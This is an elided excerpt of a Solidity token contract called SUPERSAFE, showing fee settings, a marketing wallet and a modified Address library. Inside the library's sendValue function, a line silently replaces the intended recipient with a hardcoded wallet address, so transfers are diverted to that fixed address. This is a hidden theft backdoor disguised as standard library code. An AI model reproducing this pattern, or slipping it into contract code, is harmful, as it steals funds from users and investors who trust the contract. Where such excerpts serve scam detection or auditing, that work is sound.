...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0xe57F52EF2BEE5C17BEce6DE9d6AF02799718427C);
...
contract SUPERSAFE is Context, IERC20, Ownable {
    ...
    string private constant _name = "SUPERSAFE"; // 
    string private constant _symbol = "SSF"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 7;
    uint256 public _liquidityFee = 6;
    address public  _marketingWallet = 0xC4175316De5d8A9DC090419286Fe13BE449a0a64;
